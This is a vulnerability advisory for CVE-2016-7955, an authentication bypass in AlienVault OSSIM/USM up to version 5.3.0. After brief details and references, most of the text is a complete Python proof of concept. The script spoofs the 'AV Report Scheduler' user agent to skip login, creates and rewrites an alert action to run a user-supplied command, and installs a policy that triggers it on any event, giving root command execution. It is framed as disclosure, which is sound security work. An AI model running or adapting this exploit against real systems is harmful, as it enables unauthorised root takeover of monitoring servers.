=======

Product: Alienvault OSSIM/USM
Vulnerability: Authentication Bypass
Author: Peter Lapp, lappsec () gmail com
CVE: CVE-2016-7955
Vulnerable Versions: <=5.3.0
Fixed Version: 5.3.1



Vulnerability Details
=====================

This vulnerability allows remote attackers to bypass authentication
requirements on vulnerable installations of AlienVault Unified
Security Manager. Authentication is not required to exploit this
vulnerability.

The specific flaw exists within the logcheck function in session.inc.
By providing a specific value as a user-agent, an attacker can bypass
authentication to a number of pages. In addition to viewing
information, it&#039;s possible to modify the application and achieve
arbitrary code execution as root.



References
==========

http://www.zerodayinitiative.com/advisories/ZDI-16-517/
https://www.alienvault.com/forums/discussion/7765/alienvault-v5-3-1-hotfix



POC
====

The python script below was cobbled together to demonstrate the use of
this vulnerability to gain command execution as root. The script uses
the vulnerability to retrieve the engine ID(CTX), create an email
action, change the email action to an exec action with the payload,
and then creates a policy that triggers that action on ANY event.


It will work against any USM instance without a hitch, but will only
work against OSSIM if there is some sort of action already created.
Because of the way OSSIM handles engine ID&#039;s and the lack of a
session, it&#039;s not possible to retrieve the engine ID required to
create an action.

This is just a POC so use at your own risk.



import urllib2
import urllib
from bs4 import BeautifulSoup
import ssl
import re
import random, string

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
headers = {&#039;User-Agent&#039; : &#039;AV Report Scheduler&#039;}

def randomstring():
    return &#039;&#039;.join(random.choice(string.lowercase) for i in range(6))

def getengineid(ip):
    url = &#039;https://&#039;+ip+&#039;/ossim/av_asset/network/views/net_form.php&#039;
    request = urllib2.Request(url, None, headers)
    response = urllib2.urlopen(request, context=ctx)
    getengine = response.read()
    response.close()
    soup = BeautifulSoup(getengine)
    findid = soup.find(id="sboxs1")
    engineid = findid["class"][-1]
    print &#039;Engine ID: &#039; + engineid.upper()
    return engineid.upper()

def createaction(engineid,ip):
    url = &#039;https://&#039;+ip+&#039;/ossim/action/modifyactions.php&#039;
    values = {&#039;id&#039;:&#039;&#039;,
              &#039;action&#039;:&#039;new&#039;,
              &#039;ctx&#039;:engineid,
              &#039;old_name&#039;:&#039;&#039;,
              &#039;action_name&#039;:actionname,
              &#039;old_descr&#039;:&#039;&#039;,
              &#039;descr&#039;:&#039;hacked&#039;,
              &#039;action_type&#039;:&#039;3&#039;,
              &#039;only&#039;:&#039;on&#039;,
              &#039;cond&#039;:&#039;True&#039;,
              &#039;email_from&#039;:&#039;&#039;,
              &#039;email_to&#039;:&#039;email;email;email&#039;,
              &#039;email_subject&#039;:&#039;&#039;,
              &#039;email_message&#039;:&#039;&#039;,
              &#039;exec_command&#039;:&#039;&#039;,
              &#039;transferred_user&#039;:&#039;admin&#039;,
              &#039;transferred_entity&#039;:&#039;&#039;}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(request, context=ctx)
    return

def getactionid(ip,pro):
    url = &#039;https://&#039;+ip+&#039;/ossim/action/getaction.php&#039;
    request = urllib2.Request(url, None, headers)
    response = urllib2.urlopen(request, context=ctx)
    getengine = response.read()
    response.close()
    soup = BeautifulSoup(getengine)
    if pro == &#039;y&#039;:
        rows = soup.findAll(&#039;row&#039;)
        theid = [r.get(&#039;id&#039;) for r in rows if
r.findAll(text=re.compile(actionname))][0]
    else:
        theid = soup.findAll(&#039;row&#039;)[-1].get(&#039;id&#039;)
    print &#039;Action ID: &#039; + theid.upper()
    return theid.upper()

def changeaction(ip, engineid, actionid, command):
    url = &#039;https://&#039;+ip+&#039;/ossim/action/modifyactions.php&#039;
    values = {&#039;id&#039;:actionid,
              &#039;ctx&#039;:engineid,
              &#039;action&#039;:&#039;edit&#039;,
              &#039;old_name&#039;:actionname,
              &#039;action_name&#039;:actionname,
              &#039;old_descr&#039;:&#039;hacked&#039;,
              &#039;descr&#039;:&#039;hacked&#039;,
              &#039;action_type&#039;:&#039;2&#039;,
              &#039;only&#039;:&#039;on&#039;,
              &#039;cond&#039;:&#039;True&#039;,
              &#039;email_from&#039;:&#039;&#039;,
              &#039;email_to&#039;:&#039;email;email;email&#039;,
              &#039;email_subject&#039;:&#039;&#039;,
              &#039;email_message&#039;:&#039;&#039;,
              &#039;exec_command&#039;:command,
              &#039;transferred_user&#039;:&#039;admin&#039;,
              &#039;transferred_entity&#039;:&#039;&#039;}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(request, context=ctx)
    return

def createpolicy(ip, engineid, actionid):
    url = &#039;https://&#039;+ip+&#039;/ossim/policy/newpolicy.php&#039;
    values = {&#039;descr&#039;:randomstring(),
              &#039;active&#039;:&#039;1&#039;,
              &#039;group&#039;:&#039;00000000000000000000000000000000&#039;,
              &#039;ctx&#039;:engineid,
              &#039;order&#039;:&#039;0&#039;,
              &#039;action&#039;:&#039;new&#039;,
              &#039;sources[]&#039;:&#039;00000000000000000000000000000000&#039;,
              &#039;filterc&#039;:&#039;&#039;,
              &#039;dests[]&#039;:&#039;00000000000000000000000000000000&#039;,
              &#039;filterd&#039;:&#039;&#039;,
              &#039;portsrc[]&#039;:&#039;0&#039;,
              &#039;portdst[]&#039;:&#039;0&#039;,
              &#039;plug_type&#039;:&#039;0&#039;,
              &#039;plugins[0]&#039;:&#039;on&#039;,
              &#039;tax_cat&#039;:&#039;0&#039;,
              &#039;tax_subc&#039;:&#039;0&#039;,
              &#039;mboxs[]&#039;:&#039;00000000000000000000000000000000&#039;,
              &#039;rep_act&#039;:&#039;0&#039;,
              &#039;rep_sev&#039;:&#039;1&#039;,
              &#039;rep_rel&#039;:&#039;1&#039;,
              &#039;rep_dir&#039;:&#039;1&#039;,
              &#039;rep_act&#039;:&#039;0&#039;,
              &#039;ev_sev&#039;:&#039;1&#039;,
              &#039;ev_rel&#039;:&#039;1&#039;,
              &#039;tzone&#039;:&#039;US/Central&#039;,
              &#039;date_type&#039;:&#039;1&#039;,
              &#039;begin_hour&#039;:&#039;0&#039;,
              &#039;begin_minute&#039;:&#039;0&#039;,
              &#039;begin_day_week&#039;:&#039;1&#039;,
              &#039;begin_day_month&#039;:&#039;1&#039;,
              &#039;begin_month&#039;:&#039;1&#039;,
              &#039;end_hour&#039;:&#039;23&#039;,
              &#039;end_minute&#039;:&#039;59&#039;,
              &#039;end_day_week&#039;:&#039;7&#039;,
              &#039;end_day_month&#039;:&#039;31&#039;,
              &#039;end_month&#039;:&#039;12&#039;,
              &#039;actions[]&#039;:actionid,
              &#039;sim&#039;:&#039;1&#039;,
              &#039;priority&#039;:&#039;-1&#039;,
              &#039;qualify&#039;:&#039;1&#039;,
              &#039;correlate&#039;:&#039;1&#039;,
              &#039;cross_correlate&#039;:&#039;1&#039;,
              &#039;store&#039;:&#039;1&#039;,
              &#039;sem&#039;:&#039;1&#039;,
              &#039;sign&#039;:&#039;0&#039;,
              &#039;resend_events&#039;:&#039;0&#039;}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(request, context=ctx)
    return

def reloadpolicy(ip):
    url = &#039;https://&#039;+ip+&#039;/ossim/conf/reload.php?what=policies&back=..%2Fpolicy%2Fpolicy.php&#039;
    request = urllib2.Request(url, None, headers)
    response = urllib2.urlopen(request, context=ctx)
    print &#039;Policies reloaded&#039;

print &#039;&#039;&#039;Alienvault USM/OSSIM Authentication Bypass and RCE by Peter
Lapp(lappsec)&#039;&#039;&#039;
host = raw_input(&#039;Enter USM/OSSIM IP Address: &#039;)
command = raw_input(&#039;Enter the command you want executed: &#039;)
pro = raw_input(&#039;Is this the pro version? (y/n): &#039;)
engid = getengineid(host)
actionname = randomstring()
if pro == &#039;y&#039;:
    createaction(engid, host)
actid = getactionid(host,pro)
changeaction(host,engid,actid,command)
createpolicy(host,engid,actid)
reloadpolicy(host)
print &#039;Happy hacking ;)&#039;

